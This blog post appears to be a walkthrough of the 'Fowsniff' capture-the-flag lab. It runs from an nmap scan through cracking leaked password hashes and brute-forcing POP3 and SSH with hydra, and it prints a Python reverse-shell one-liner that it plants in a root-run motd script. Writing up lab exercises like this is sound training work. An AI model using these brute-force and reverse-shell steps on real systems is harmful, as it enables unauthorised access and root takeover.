---
layout: post
permalink: /posts/thm/fowsniff-ctf
title: "Fowsniff CTF"
---

Scan the target machine with nmap

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/fowsniff-ctf/nmap.png)

There are 4 open ports. Let's go and visit the web server.

![web-server](/assets/images/thm/fowsniff-ctf/web-server.png)

It looks that the company has been hacked. Searching for the Twitter account `@fowsniffcorp` leads us to a profile where we can find a link to Pastebin with their leaked password.

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

We can use `https://crackstation.net/` to crack all the passwords. Once you have already cracked the passwords (I wasn't able to crack one of them) create two files one for `users` populated with the user names and one for `passwords` populated with the passwords. Now we can try to brute force the POP3 service using hydra.

```
hydra -L users -P passwords pop3://<IP>
```

![hydra](/assets/images/thm/fowsniff-ctf/hydra.png)

We have successfully bruted the POP3 service. Now login.

```
nc <IP> 110
```

or

```
telnet <IP> 110
```

![pop3](/assets/images/thm/fowsniff-ctf/pop3.png)

Reading through the emails you will find a SSH password. Create a new file with the recipients of the email and we are going to use hydra again to brute force SSH service.

```
hydra -L sshusers -p S1ck3nBluff+secureshell ssh://<IP>
```

![hydra2](/assets/images/thm/fowsniff-ctf/hydra2.png)

Now we can connect to SSH

```
ssh <USER_NAME>@<IP>
```

![ssh](/assets/images/thm/fowsniff-ctf/ssh.png)

Now we need to find out what group our user belongs to and search for interesting files that can be run by that group.

```
id
find / -type f -group users 2>/dev/null
```

![find](/assets/images/thm/fowsniff-ctf/find.png)

Let's look the content of the script

![script](/assets/images/thm/fowsniff-ctf/script.png)

It looks the same as the banner we saw when we SSH which means this file is run as root when someone SSH. We can check that as we read `/etc/update-motd.d/00-header`

![cat](/assets/images/thm/fowsniff-ctf/cat.png)

Well, let's add the python reverse shell script into `/opt/cube/cube.sh`

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Once cube.sh is changed start listener on our machine and SSH again. You should receive root shell.